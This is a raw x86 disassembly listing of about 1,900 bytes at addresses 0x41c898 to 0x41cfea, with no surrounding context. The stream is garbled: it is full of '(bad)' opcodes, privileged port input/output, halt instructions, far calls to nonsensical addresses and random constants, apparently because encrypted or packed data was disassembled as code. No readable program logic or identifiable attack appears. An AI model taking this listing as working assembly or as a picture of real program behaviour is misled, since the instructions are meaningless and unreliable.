  41c898:	xlat   BYTE PTR ds:[ebx]
  41c899:	xlat   BYTE PTR ds:[ebx]
  41c89a:	shl    edi,cl
  41c89c:	add    al,0xf1
  41c89e:	popa   
  41c89f:	lods   eax,DWORD PTR ss:[esi]
  41c8a1:	mov    al,0xcf
  41c8a3:	in     al,dx
  41c8a4:	or     eax,ebp
  41c8a6:	mov    ebx,0xf9827dac
  41c8ab:	lods   eax,DWORD PTR ds:[esi]
  41c8ac:	sbb    ebp,DWORD PTR [edx]
  41c8ae:	lahf   
  41c8af:	lock jo 0x41c8dd
  41c8b2:	add    BYTE PTR [esi],ch
  41c8b4:	imul   eax,ebp,0xd
  41c8b7:	in     al,0xca
  41c8b9:	jecxz  0x41c934
  41c8bb:	xor    ebp,edx
  41c8bd:	cmp    eax,0x20ef782d
  41c8c2:	mov    al,0x6f
  41c8c4:	test   eax,0x1b7b183e
  41c8c9:	jno    0x41c93a
  41c8cb:	mov    ecx,0xff376c5d
  41c8d0:	aam    0xd
  41c8d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8d3:	out    dx,al
  41c8d4:	hlt    
  41c8d5:	mov    WORD PTR [ebp+0x48],es
  41c8d8:	jae    0x41c894
  41c8da:	fucomip st,st(5)
  41c8dc:	dec    esp
  41c8dd:	mov    ah,0xaf
  41c8df:	repz or eax,0xc97abeeb
  41c8e5:	fcomp  QWORD PTR [eax]
  41c8e7:	pop    esi
  41c8e8:	or     edi,ecx
  41c8ea:	addr16 pop edx
  41c8ec:	mov    ah,0x34
  41c8ee:	(bad)  
  41c8ef:	into   
  41c8f0:	fnsave [edx]
  41c8f2:	imul   edx,DWORD PTR [ebp-0x50af4da7],0xd0340afc
  41c8fc:	push   0x731e5427
  41c901:	pop    edi
  41c902:	dec    esi
  41c903:	mov    esp,0x12e9b1ca
  41c908:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c909:	jmp    0x41c904
  41c90b:	jmp    FWORD PTR ds:0x68e059d3
  41c911:	adc    edi,edx
  41c913:	stos   BYTE PTR es:[edi],al
  41c914:	xor    eax,0xbc288c2b
  41c919:	call   0xb95f:0xace1cd55
  41c920:	mov    BYTE PTR [edx+edx*4-0x28],ah
  41c924:	sbb    al,0x24
  41c926:	je     0x41c985
  41c928:	clc    
  41c929:	and    eax,DWORD PTR [edi+0x58]
  41c92c:	jle    0x41c8e9
  41c92e:	push   edx
  41c92f:	sbb    eax,0x258eb1c9
  41c934:	mov    ebp,0xde203b31
  41c939:	sub    eax,0xb34e0859
  41c93e:	(bad)  
  41c93f:	stos   DWORD PTR es:[edi],eax
  41c940:	push   0x2b18df9f
  41c945:	dec    edx
  41c946:	sbb    ecx,DWORD PTR [eax+0x72]
  41c949:	pop    esp
  41c94a:	inc    ecx
  41c94b:	xchg   esp,eax
  41c94c:	ror    DWORD PTR [ebx],cl
  41c94e:	and    eax,0xe44b82a4
  41c953:	sub    bh,ch
  41c955:	push   0x57
  41c957:	and    esi,ecx
  41c959:	inc    esi
  41c95a:	pop    ebp
  41c95b:	mov    cl,0x87
  41c95d:	cmp    eax,0xae34b08e
  41c962:	rol    BYTE PTR [ebx+0x1e8457bf],cl
  41c968:	mov    ecx,0xe52170c9
  41c96d:	sub    edi,DWORD PTR [eax+0x2e04a0a3]
  41c973:	xchg   ebp,eax
  41c974:	dec    ecx
  41c975:	addr16 pop ecx
  41c977:	mov    dl,0x7e
  41c97a:	push   0xbc702483
  41c97f:	cmp    BYTE PTR [edx+0x5f725cfa],dh
  41c985:	cdq    
  41c986:	mov    al,0x3f
  41c988:	push   ebx
  41c989:	out    0x27,eax
  41c98b:	or     BYTE PTR [ecx-0x31],0xb7
  41c98f:	inc    ebx
  41c990:	int    0x7
  41c992:	out    dx,al
  41c993:	and    BYTE PTR [ebx],ch
  41c995:	ss (bad) 
  41c997:	imul   ecx,DWORD PTR [ecx],0x39880e29
  41c99d:	int3   
  41c99e:	add    DWORD PTR [eax],ecx
  41c9a0:	lock cmp al,0x16
  41c9a3:	and    esp,eax
  41c9a5:	xchg   esi,eax
  41c9a6:	in     eax,0x25
  41c9a8:	test   eax,0x9aebe5f3
  41c9ad:	out    0x5a,al
  41c9af:	or     eax,0xfe80ac4b
  41c9b4:	inc    esi
  41c9b5:	retf   0xbd7d
  41c9b8:	jl     0x41c9b5
  41c9ba:	cs inc ebx
  41c9bc:	mov    ds:0x5ee748b8,eax
  41c9c1:	push   esi
  41c9c2:	popf   
  41c9c3:	lock xor DWORD PTR [edi+eax*4+0x7f],0x41
  41c9c9:	stos   BYTE PTR es:[edi],al
  41c9ca:	loope  0x41c979
  41c9cc:	inc    esi
  41c9cd:	repnz dec ecx
  41c9cf:	and    ebp,0x2d
  41c9d2:	repnz inc BYTE PTR [eax+ebp*2-0x51]
  41c9d7:	es cmp bl,cl
  41c9da:	xor    DWORD PTR [ebp+0x5e],esi
  41c9dd:	out    dx,al
  41c9de:	(bad)  
  41c9df:	rcr    DWORD PTR [esi+0x1c],cl
  41c9e2:	push   ds
  41c9e3:	ins    BYTE PTR es:[edi],dx
  41c9e4:	scas   al,BYTE PTR es:[edi]
  41c9e5:	aad    0xda
  41c9e7:	adc    bh,BYTE PTR [ebx-0x56e3ccd6]
  41c9ed:	int    0x4f
  41c9ef:	stos   BYTE PTR es:[edi],al
  41c9f0:	sbb    esi,edi
  41c9f2:	lods   eax,DWORD PTR ds:[esi]
  41c9f3:	mov    dl,0x58
  41c9f5:	mov    ds:0x25d3b105,al
  41c9fa:	mov    edx,ds
  41c9fc:	push   esi
  41c9fd:	nop
  41c9fe:	and    esi,DWORD PTR [edi+eax*2-0x1f]
  41ca02:	sub    ebp,ebp
  41ca04:	imul   ebp,DWORD PTR [ebx+0x2f],0x63d43586
  41ca0b:	cmp    DWORD PTR [edi],edx
  41ca0d:	inc    ebx
  41ca0e:	jl     0x41ca50
  41ca10:	lock (bad) 
  41ca12:	repz aad 0x37
  41ca15:	or     ah,BYTE PTR [ebx]
  41ca17:	lds    edx,FWORD PTR [ebp+0x74]
  41ca1a:	or     eax,0x29375023
  41ca1f:	shl    DWORD PTR [esi],cl
  41ca21:	imul   ebx,eax,0x7210b6c1
  41ca27:	inc    esi
  41ca28:	jl     0x41ca6e
  41ca2a:	mov    al,ds:0x5238b54b
  41ca2f:	inc    ebp
  41ca30:	js     0x41c9f9
  41ca32:	mov    gs,WORD PTR [ebx]
  41ca34:	push   ds
  41ca35:	mov    eax,0x3825bec3
  41ca3a:	xor    DWORD PTR [ecx-0x7e5f525d],esi
  41ca40:	stos   DWORD PTR es:[edi],eax
  41ca41:	test   al,0x2a
  41ca43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca44:	mov    bh,0xbb
  41ca46:	fwait
  41ca47:	jne    0x41ca68
  41ca49:	dec    eax
  41ca4a:	das    
  41ca4b:	fmul   QWORD PTR [esp+eax*1]
  41ca4e:	(bad)  
  41ca4f:	pusha  
  41ca50:	das    
  41ca51:	gs sti 
  41ca53:	pop    ecx
  41ca54:	mov    bh,0x36
  41ca56:	sbb    DWORD PTR [esi-0xc],edi
  41ca59:	(bad)  
  41ca5a:	adc    DWORD PTR [edi+0x38],ebx
  41ca5d:	sbb    bh,dl
  41ca5f:	xchg   ecx,eax
  41ca60:	fsubr  QWORD PTR [ebx-0x6bc903e1]
  41ca66:	(bad)  
  41ca67:	mov    eax,0x59d304ca
  41ca6c:	gs pop ebx
  41ca6e:	addps  xmm1,XMMWORD PTR [esi]
  41ca71:	fs pop ecx
  41ca73:	or     al,0x78
  41ca75:	dec    ebx
  41ca76:	push   ebp
  41ca77:	sub    dh,BYTE PTR [ebx-0x7f1c2a47]
  41ca7d:	out    0x7f,eax
  41ca7f:	aam    0x98
  41ca81:	xor    al,0x3c
  41ca83:	add    eax,0x7f64dd79
  41ca88:	repnz es test al,0x5d
  41ca8c:	push   cs
  41ca8d:	es aam 0x9a
  41ca90:	add    al,0x83
  41ca92:	dec    edx
  41ca93:	sti    
  41ca94:	xchg   ch,al
  41ca96:	pop    eax
  41ca97:	and    eax,0xee5e1a1d
  41ca9c:	pmaxub mm7,QWORD PTR [ecx]
  41ca9f:	xchg   ebx,eax
  41caa0:	bound  ebx,QWORD PTR [edx-0x3a]
  41caa3:	cmp    al,0x40
  41caa5:	xor    edi,DWORD PTR [esi-0xe]
  41caa8:	xchg   esp,eax
  41caa9:	push   edi
  41caaa:	mov    esp,0x9849d7e7
  41caaf:	lahf   
  41cab0:	or     ch,BYTE PTR [edi+0x69]
  41cab3:	mov    ebx,0x3da97e03
  41cab8:	js     0x41ca81
  41caba:	popf   
  41cabb:	and    eax,0x94d68e01
  41cac0:	mov    ebx,0xb1061a65
  41cac5:	in     al,0x15
  41cac7:	jb     0x41cb3e
  41cac9:	lock push esi
  41cacb:	pop    ss
  41cacc:	lock mov ecx,0x39233632
  41cad2:	cld    
  41cad3:	jl     0x41cabd
  41cad5:	xchg   esp,eax
  41cad6:	push   ebx
  41cad7:	repnz nop
  41cad9:	in     eax,dx
  41cada:	sti    
  41cadb:	arpl   ax,bx
  41cadd:	sbb    ah,BYTE PTR [eax-0x25f59147]
  41cae3:	jmp    0x41ca75
  41cae5:	fs jl  0x41cab9
  41cae8:	jb     0x41caac
  41caea:	push   ss
  41caeb:	sti    
  41caec:	std    
  41caed:	inc    ebp
  41caee:	push   esp
  41caef:	mov    esi,0x5b3d5d8e
  41caf4:	push   edi
  41caf5:	and    edi,ecx
  41caf7:	jge    0x41cb5d
  41caf9:	jg     0x41caaf
  41cafb:	jp     0x41cb70
  41cafd:	cmp    esi,DWORD PTR [ebp+0x6]
  41cb00:	xor    BYTE PTR [ebx-0x672601a0],0x35
  41cb07:	idiv   BYTE PTR [ebx+0x16cf670]
  41cb0d:	xor    eax,0x21258c6c
  41cb12:	ds scas eax,DWORD PTR es:[edi]
  41cb14:	sahf   
  41cb15:	test   DWORD PTR [edi+0xb8bfc88],edi
  41cb1b:	push   0x30
  41cb1d:	sub    bl,BYTE PTR ds:0xa1baa242
  41cb23:	sub    DWORD PTR [ecx+0x43691389],0xffffffbb
  41cb2a:	and    eax,0xd0224e1d
  41cb2f:	lock sbb al,0xc7
  41cb32:	cs stos BYTE PTR es:[edi],al
  41cb34:	ret    
  41cb35:	sbb    cl,BYTE PTR [eax]
  41cb37:	jg     0x41cb49
  41cb39:	sbb    al,0x19
  41cb3b:	add    DWORD PTR [edx-0x21],0xfffffff0
  41cb3f:	int3   
  41cb40:	aam    0xf9
  41cb42:	dec    esp
  41cb43:	add    BYTE PTR [edi+eax*8-0x10c424b0],ah
  41cb4a:	push   es
  41cb4b:	mov    al,ds:0x80856440
  41cb50:	lods   eax,DWORD PTR ds:[esi]
  41cb51:	out    dx,eax
  41cb52:	sahf   
  41cb53:	push   es
  41cb54:	mov    dh,BYTE PTR [edi+0x59899ea8]
  41cb5a:	jnp    0x41cb96
  41cb5c:	into   
  41cb5d:	fidiv  WORD PTR [eax+eax*8+0x1a367e74]
  41cb64:	fst    DWORD PTR [ebx]
  41cb66:	aad    0x16
  41cb68:	aas    
  41cb69:	ins    DWORD PTR es:[edi],dx
  41cb6a:	push   esi
  41cb6b:	pushf  
  41cb6c:	leave  
  41cb6d:	ror    BYTE PTR [esi],1
  41cb6f:	jg     0x41caf3
  41cb71:	loope  0x41cb6f
  41cb73:	pop    esi
  41cb74:	inc    esp
  41cb75:	push   0x4dd6e288
  41cb7a:	mov    ah,0x96
  41cb7c:	mov    al,ds:0xd10b651d
  41cb81:	or     bh,BYTE PTR [eax+ebp*4+0x2958cd0b]
  41cb88:	jno    0x41cb3c
  41cb8a:	ror    dl,1
  41cb8c:	repnz scas eax,DWORD PTR es:[edi]
  41cb8e:	jge    0x41cbba
  41cb90:	sub    DWORD PTR [eax-0x78],eax
  41cb93:	es cmp cl,ah
  41cb96:	fsubr  DWORD PTR [esi]
  41cb98:	cld    
  41cb99:	sbb    DWORD PTR [esi-0x27],ebx
  41cb9c:	jmp    0x41cba8
  41cb9e:	add    DWORD PTR [eax+0x34],eax
  41cba1:	inc    esp
  41cba2:	mov    al,0xda
  41cba4:	or     ebx,DWORD PTR [edx-0x17]
  41cba7:	pop    ss
  41cba8:	fmul   st,st(7)
  41cbaa:	pop    edi
  41cbab:	es inc edx
  41cbad:	shl    BYTE PTR [edi+ebx*2],1
  41cbb0:	inc    ebx
  41cbb1:	retf   0x33a0
  41cbb4:	inc    ebx
  41cbb5:	jbe    0x41cbdc
  41cbb7:	adc    al,BYTE PTR [ebx]
  41cbb9:	icebp  
  41cbba:	rcr    ecx,0x9b
  41cbbd:	outs   dx,DWORD PTR ds:[esi]
  41cbbe:	adc    eax,DWORD PTR [eax+edx*1-0xb]
  41cbc2:	xor    al,0xde
  41cbc4:	out    dx,eax
  41cbc5:	sbb    DWORD PTR [edx],edi
  41cbc7:	jl     0x41cc0a
  41cbc9:	fadd   QWORD PTR [esi]
  41cbcb:	mov    ecx,0x92b07548
  41cbd0:	cmp    al,0x7a
  41cbd2:	push   eax
  41cbd3:	push   cs
  41cbd4:	jno    0x41cb67
  41cbd6:	pop    esp
  41cbd7:	push   edx
  41cbd8:	mov    DWORD PTR ds:0xa3d7e226,0xe20b8ea5
  41cbe2:	cs je  0x41cc2c
  41cbe5:	inc    DWORD PTR [esi-0x38]
  41cbe8:	daa    
  41cbe9:	mov    dl,0x62
  41cbeb:	int3   
  41cbec:	out    dx,al
  41cbed:	scas   al,BYTE PTR es:[edi]
  41cbee:	ror    BYTE PTR [eax+0x5f],0xd
  41cbf2:	jg     0x41cbf5
  41cbf4:	xchg   ebp,eax
  41cbf5:	sub    BYTE PTR [esi+0x67],dh
  41cbf8:	icebp  
  41cbf9:	mov    cl,0x12
  41cbfb:	sar    esi,1
  41cbfd:	cdq    
  41cbfe:	dec    esp
  41cbff:	sbb    eax,0x8f4d529
  41cc04:	(bad)  
  41cc05:	pushf  
  41cc06:	call   0x7657:0x77d6ea8c
  41cc0d:	sbb    eax,0xa9982e8e
  41cc12:	cli    
  41cc13:	mov    ds:0xd60e321f,al
  41cc18:	sub    ah,BYTE PTR [eax-0x6]
  41cc1b:	xchg   BYTE PTR [ecx-0x9e38b49],bh
  41cc21:	push   edi
  41cc22:	fist   WORD PTR [ecx+0x6271bd31]
  41cc28:	loop   0x41cca5
  41cc2a:	sbb    BYTE PTR es:[ebx-0x23],0xeb
  41cc2f:	std    
  41cc30:	pusha  
  41cc31:	xchg   edi,ecx
  41cc33:	mov    al,ds:0x414e0244
  41cc38:	and    eax,0xb65ad6fc
  41cc3d:	add    eax,0xcb8ce671
  41cc42:	fadd   st(7),st
  41cc44:	dec    BYTE PTR [ebp+0xa]
  41cc47:	shl    DWORD PTR [eax+0x63676f38],cl
  41cc4d:	adc    al,0xf
  41cc4f:	xor    esi,edx
  41cc51:	and    BYTE PTR [ebp+ebp*1-0x4b],0x89
  41cc56:	lds    edx,FWORD PTR [edx+0x17]
  41cc59:	cli    
  41cc5a:	adc    DWORD PTR ds:0x2abb482f,ebx
  41cc60:	pusha  
  41cc61:	mov    WORD PTR [ecx+0x769948a1],?
  41cc67:	cmp    esp,edx
  41cc69:	xchg   edx,eax
  41cc6a:	inc    esi
  41cc6b:	cmp    DWORD PTR [eax+0x20],ebp
  41cc6e:	fistp  QWORD PTR [ecx]
  41cc70:	xchg   ecx,eax
  41cc71:	dec    eax
  41cc72:	in     eax,dx
  41cc73:	sbb    al,0x3b
  41cc75:	mov    dl,0x11
  41cc77:	xchg   ebx,eax
  41cc78:	rcl    BYTE PTR [edx],0x8c
  41cc7b:	pop    ebp
  41cc7c:	je     0x41cc33
  41cc7e:	and    esp,DWORD PTR [ecx+0xdb8a79]
  41cc84:	(bad)  
  41cc85:	cwde   
  41cc86:	push   ebx
  41cc87:	loopne 0x41ccb7
  41cc89:	sub    edx,esp
  41cc8b:	or     esp,DWORD PTR [esi+eax*4]
  41cc8e:	loop   0x41cc9c
  41cc90:	test   DWORD PTR [edx+0x2f41aa0e],0x101012d7
  41cc9a:	sbb    al,al
  41cc9c:	retf   
  41cc9d:	or     DWORD PTR [eax-0x7c88664f],ecx
  41cca3:	mov    esp,0xbcd7313d
  41cca8:	fs sti 
  41ccaa:	shl    BYTE PTR [edi],1
  41ccac:	jno    0x41cccb
  41ccae:	sahf   
  41ccaf:	jne    0x41cd1f
  41ccb1:	mov    eax,ds:0xaa1d1809
  41ccb6:	and    al,0x38
  41ccb8:	or     esi,esi
  41ccba:	pop    eax
  41ccbb:	mov    ah,0x95
  41ccbd:	addr16 jne 0x41cd27
  41ccc0:	fbld   TBYTE PTR [ebp-0x2a82bafd]
  41ccc6:	jae    0x41cc8f
  41ccc8:	int    0x82
  41ccca:	cld    
  41cccb:	jp     0x41cc92
  41cccd:	in     al,dx
  41ccce:	into   
  41cccf:	mov    WORD PTR [ebp+0x557a06f5],gs
  41ccd5:	or     DWORD PTR [ebp-0x1d],ecx
  41ccd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ccd9:	or     eax,0xffb7b822
  41ccde:	mov    bh,0x35
  41cce0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cce1:	imul   BYTE PTR [edx+0xa]
  41cce4:	mov    cl,0xc7
  41cce6:	dec    ecx
  41cce7:	jle    0x41ccc9
  41cce9:	in     eax,0x58
  41cceb:	mov    DWORD PTR [eax+0x20],edx
  41ccee:	stos   BYTE PTR es:[edi],al
  41ccef:	mov    al,ds:0xf86cf69b
  41ccf4:	adc    eax,DWORD PTR [edx+0x65]
  41ccf7:	cmp    edx,DWORD PTR [ecx-0x37]
  41ccfa:	xchg   esi,eax
  41ccfb:	scas   al,BYTE PTR es:[edi]
  41ccfc:	cvtpi2ps xmm1,QWORD PTR [ebx-0x1e98808d]
  41cd03:	sahf   
  41cd04:	es popa 
  41cd06:	dec    edx
  41cd07:	mov    DWORD PTR [eax],ecx
  41cd09:	mov    esp,0x53772192
  41cd0e:	push   cs
  41cd0f:	pop    eax
  41cd10:	pusha  
  41cd11:	fs mov bl,0xa5
  41cd14:	in     eax,dx
  41cd15:	sar    BYTE PTR [esp+esi*2+0x4d],cl
  41cd19:	cmc    
  41cd1a:	pop    eax
  41cd1b:	loope  0x41cd97
  41cd1d:	gs inc ebx
  41cd1f:	cli    
  41cd20:	rcl    DWORD PTR [ebx-0x25],0x85
  41cd24:	jle    0x41ccda
  41cd26:	sbb    BYTE PTR [edx-0x3226aa35],dh
  41cd2c:	loope  0x41cd73
  41cd2e:	inc    edx
  41cd2f:	fld    TBYTE PTR [esi+ebx*8+0x2677e9e9]
  41cd36:	or     al,0xea
  41cd38:	shl    DWORD PTR [ecx*4-0x43e3497],0x1f
  41cd40:	mov    ah,0x34
  41cd42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd43:	jns    0x41cd57
  41cd45:	mov    edx,0x132b4ad9
  41cd4a:	mov    WORD PTR [ecx-0x53],gs
  41cd4d:	inc    edi
  41cd4e:	push   ebp
  41cd4f:	fstp   TBYTE PTR [ecx-0x33]
  41cd52:	call   0x184c:0xa44bce1a
  41cd59:	enter  0xb32e,0x14
  41cd5d:	loop   0x41cdbc
  41cd5f:	dec    ebp
  41cd60:	mov    ecx,0x9968d74a
  41cd65:	jns    0x41cd6d
  41cd67:	loope  0x41cd7f
  41cd69:	jbe    0x41cd4f
  41cd6b:	xor    ax,0xabaf
  41cd6f:	inc    ebp
  41cd70:	xchg   edi,eax
  41cd71:	jnp    0x41cd41
  41cd73:	sbb    edi,ecx
  41cd75:	in     eax,0xad
  41cd77:	add    al,0xcf
  41cd79:	call   0xd2c3:0x8229e82f
  41cd80:	cmp    eax,0x5522fc8e
  41cd85:	cmp    edi,DWORD PTR [esi-0x5901957c]
  41cd8b:	push   cs
  41cd8c:	lods   eax,DWORD PTR ds:[esi]
  41cd8d:	sub    ah,cl
  41cd8f:	mov    bh,0x9a
  41cd91:	fsub   st(5),st
  41cd93:	add    eax,0x2337e59e
  41cd98:	mov    dh,0xbb
  41cd9a:	into   
  41cd9b:	push   ds
  41cd9c:	enter  0x7b7f,0xeb
  41cda0:	(bad)  
  41cda2:	add    BYTE PTR [eax],dh
  41cda4:	inc    ebp
  41cda5:	xchg   esi,eax
  41cda6:	pop    ecx
  41cda7:	lds    edx,FWORD PTR [eax]
  41cda9:	cmp    al,0xde
  41cdab:	jg     0x41cdf6
  41cdad:	call   0xff7f:0x47c14e78
  41cdb4:	adc    al,0x45
  41cdb6:	jo     0x41ce04
  41cdb8:	enter  0xc0b2,0xa9
  41cdbc:	cmp    eax,0xded214fc
  41cdc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cdc2:	das    
  41cdc3:	popa   
  41cdc4:	or     DWORD PTR [ecx-0x67],0xffffffb6
  41cdc8:	xchg   edi,eax
  41cdc9:	in     eax,0x2e
  41cdcb:	mov    BYTE PTR [edi+0x768ea8be],ah
  41cdd1:	pop    ds
  41cdd2:	mov    al,ds:0x7b349bad
  41cdd7:	into   
  41cdd8:	lds    ebx,FWORD PTR [edi+0x2d]
  41cddb:	push   edi
  41cddc:	and    BYTE PTR [ebx],ah
  41cdde:	mov    DWORD PTR [ecx+0x1a659f7c],edx
  41cde4:	xchg   ebp,eax
  41cde5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cde6:	outs   dx,DWORD PTR ds:[esi]
  41cde7:	jg     0x41ce20
  41cde9:	sub    BYTE PTR [edi-0x7c],ah
  41cdec:	mov    DWORD PTR [edi],ebp
  41cdee:	fisub  WORD PTR [esi+0x42]
  41cdf1:	xchg   bh,bl
  41cdf3:	(bad)  
  41cdf4:	sbb    DWORD PTR [edi+0x6b],edx
  41cdf7:	sbb    al,0xe4
  41cdf9:	jmp    0x5b8c25a2
  41cdfe:	cli    
  41cdff:	and    bh,dh
  41ce01:	jo     0x41ce7d
  41ce03:	aaa    
  41ce04:	mov    DWORD PTR [esi+0x17],edi
  41ce07:	and    BYTE PTR [eax],cl
  41ce09:	ds idiv bl
  41ce0c:	cld    
  41ce0d:	jle    0x41cdea
  41ce0f:	jae    0x41ce16
  41ce11:	arpl   di,di
  41ce13:	shl    ecx,0x48
  41ce16:	pop    ss
  41ce17:	repz push esp
  41ce19:	pop    edx
  41ce1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce1b:	mov    esp,0x73094f6
  41ce20:	cmp    eax,DWORD PTR [ebp-0x4b]
  41ce23:	dec    eax
  41ce24:	stos   DWORD PTR es:[edi],eax
  41ce25:	sbb    DWORD PTR [ecx],eax
  41ce27:	outs   dx,BYTE PTR ds:[esi]
  41ce28:	fwait
  41ce29:	adc    BYTE PTR [esi-0x71],0xfe
  41ce2d:	cmp    BYTE PTR [edx],ch
  41ce2f:	sbb    ebx,DWORD PTR [esi-0x49]
  41ce32:	adc    DWORD PTR [ebp-0x378098d1],0xfcf8ed92
  41ce3c:	call   0x1a7c5c4b
  41ce41:	fmul   QWORD PTR ds:0x2ad51d9a
  41ce47:	dec    eax
  41ce48:	fs mov dh,0x68
  41ce4b:	xor    ah,BYTE PTR [edx]
  41ce4d:	stos   DWORD PTR es:[edi],eax
  41ce4e:	imul   ecx,DWORD PTR [esi+0x19],0xffffff94
  41ce52:	aas    
  41ce53:	dec    esp
  41ce54:	aaa    
  41ce55:	and    al,0x39
  41ce57:	mov    bh,0x3e
  41ce59:	cli    
  41ce5a:	rcr    ebx,cl
  41ce5c:	das    
  41ce5d:	shl    DWORD PTR [ebp+0x1e],0xc5
  41ce61:	cmp    DWORD PTR [eax+ebp*2+0x11b1c1ae],ecx
  41ce68:	jne    0x41ceb7
  41ce6a:	mov    dh,0x16
  41ce6c:	jne    0x41ce69
  41ce6e:	xor    al,0xb3
  41ce70:	lock push ecx
  41ce72:	and    esp,DWORD PTR [eax+ecx*2-0x2e0675ff]
  41ce79:	fisttp QWORD PTR [ebx-0x7c]
  41ce7c:	jae    0x41ce7e
  41ce7e:	mov    fs,WORD PTR [edx-0x5b286127]
  41ce84:	mov    ds:0x9bea8026,al
  41ce89:	enter  0x7355,0x55
  41ce8d:	mov    edi,0x82bccae6
  41ce92:	fiadd  DWORD PTR [ebp+0x34]
  41ce95:	scas   al,BYTE PTR es:[edi]
  41ce96:	xor    al,0x41
  41ce98:	add    BYTE PTR [ebx-0x25],0xe3
  41ce9c:	stc    
  41ce9d:	cmp    bl,BYTE PTR [eax-0xa]
  41cea0:	outs   dx,BYTE PTR ds:[esi]
  41cea1:	and    dh,BYTE PTR [edx-0x33]
  41cea4:	out    dx,eax
  41cea5:	dec    eax
  41cea6:	and    DWORD PTR [ecx-0x7d],ebp
  41cea9:	dec    ecx
  41ceaa:	mov    ch,0xd
  41ceac:	push   ds
  41cead:	xchg   ecx,eax
  41ceae:	test   BYTE PTR [esi],0xc4
  41ceb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ceb2:	lds    edx,FWORD PTR [edi-0x78bc4483]
  41ceb8:	xchg   DWORD PTR ds:0x47b1288c,ebp
  41cebe:	mov    dh,0x12
  41cec0:	mov    dh,0xfa
  41cec2:	add    esi,ebp
  41cec4:	xchg   edx,eax
  41cec5:	repnz sub DWORD PTR [edx+0x40],esp
  41cec9:	outs   dx,DWORD PTR ds:[esi]
  41ceca:	push   eax
  41cecb:	jbe    0x41ced7
  41cecd:	enter  0x8933,0x9a
  41ced1:	sub    bl,BYTE PTR [eax-0x22]
  41ced4:	cmp    dh,BYTE PTR [esi]
  41ced6:	mov    al,0xc2
  41ced8:	mov    edi,esi
  41ceda:	(bad)
  41cedd:	xor    esi,DWORD PTR [ecx*8+0xdae88ca]
  41cee4:	fwait
  41cee5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cee6:	or     DWORD PTR [edi-0x547ad86d],0x21
  41ceed:	xchg   DWORD PTR [edi+0x7f],esi
  41cef0:	loopne 0x41cf1b
  41cef2:	jne    0x41cef4
  41cef4:	fnstsw WORD PTR es:[edi+ecx*8-0x28]
  41cef9:	test   ebp,0x1dd0adfb
  41ceff:	out    dx,eax
  41cf00:	call   0x9a20:0x409504bc
  41cf07:	arpl   WORD PTR [eax+0x7e],cx
  41cf0a:	push   edx
  41cf0b:	fldcw  WORD PTR [edi-0x1e]
  41cf0e:	mov    esp,DWORD PTR [ebp+0x1f]
  41cf11:	pop    es
  41cf12:	jnp    0x41cf01
  41cf14:	fmul   DWORD PTR [ebx+0x77]
  41cf17:	cmp    al,0x7d
  41cf19:	push   ebx
  41cf1a:	cmc    
  41cf1b:	cli    
  41cf1c:	call   0xb15f1440
  41cf21:	call   DWORD PTR [eax+0x79]
  41cf25:	shl    ch,cl
  41cf27:	sub    ebp,ecx
  41cf29:	push   esi
  41cf2a:	dec    ecx
  41cf2b:	dec    edx
  41cf2c:	out    dx,eax
  41cf2d:	and    eax,0xd9757e67
  41cf32:	das    
  41cf33:	dec    eax
  41cf34:	mov    dl,0x2f
  41cf36:	mov    esi,0x81cb987c
  41cf3b:	fcom   DWORD PTR [ebx+0x591bc5d6]
  41cf41:	mov    dl,0x64
  41cf43:	push   ds
  41cf44:	leave  
  41cf45:	cmp    ebp,DWORD PTR [ebx]
  41cf47:	imul   edi,DWORD PTR [ecx],0xe0f37eee
  41cf4d:	pop    ebp
  41cf4e:	fbstp  TBYTE PTR [ecx+0x2ce0ae49]
  41cf54:	mov    BYTE PTR [ebx+0x628212c5],0x1
  41cf5b:	jae    0x41cf67
  41cf5d:	xchg   ecx,eax
  41cf5e:	sti    
  41cf5f:	call   0xb85e471f
  41cf64:	or     al,0x83
  41cf66:	mov    dl,0xc5
  41cf68:	xchg   ebp,eax
  41cf69:	fisttp QWORD PTR ds:0xdea70084
  41cf6f:	mov    eax,ds:0xf98b578f
  41cf74:	ins    BYTE PTR es:[edi],dx
  41cf75:	cmp    ecx,esi
  41cf77:	loope  0x41cf58
  41cf79:	xlat   BYTE PTR ds:[ebx]
  41cf7a:	in     eax,0x1b
  41cf7c:	add    BYTE PTR [edx-0x46],bl
  41cf7f:	not    ch
  41cf81:	jecxz  0x41cfd0
  41cf83:	sbb    eax,0xe19d1891
  41cf88:	mov    ebx,DWORD PTR [ecx+0x33a078d3]
  41cf8e:	xlat   BYTE PTR ds:[ebx]
  41cf8f:	pusha  
  41cf90:	out    0xf0,al
  41cf92:	xchg   esi,eax
  41cf93:	jnp    0x41cfc0
  41cf95:	dec    ecx
  41cf96:	xor    esi,0xb1019bd6
  41cf9c:	lods   eax,DWORD PTR ds:[esi]
  41cf9d:	push   ebp
  41cf9e:	int3   
  41cf9f:	jl     0x41d004
  41cfa1:	sub    al,0x73
  41cfa3:	sub    BYTE PTR [ebx-0x76],0x9c
  41cfa7:	xor    BYTE PTR [ecx+0x135301ee],bl
  41cfad:	dec    ebx
  41cfae:	sub    ah,bh
  41cfb0:	es adc eax,0x4df050ec
  41cfb6:	stc    
  41cfb7:	ins    BYTE PTR es:[edi],dx
  41cfb8:	push   0x99e03377
  41cfbd:	in     eax,0x54
  41cfbf:	xor    al,0xbd
  41cfc1:	mov    dl,0x2b
  41cfc3:	adc    al,0x50
  41cfc5:	popf   
  41cfc6:	test   BYTE PTR [ecx-0x5de6942b],0x1e
  41cfcd:	dec    ebp
  41cfce:	mov    al,0xe1
  41cfd0:	shl    ch,0x0
  41cfd3:	jne    0x41cf83
  41cfd5:	cmp    eax,0x163e14e8
  41cfda:	push   eax
  41cfdb:	popa   
  41cfdc:	cmp    eax,0xe0f53777
  41cfe1:	out    dx,al
  41cfe2:	xchg   esi,eax
  41cfe3:	aam    0xa8
  41cfe5:	mov    ebp,0x279062bf
  41cfea:	out    dx,al
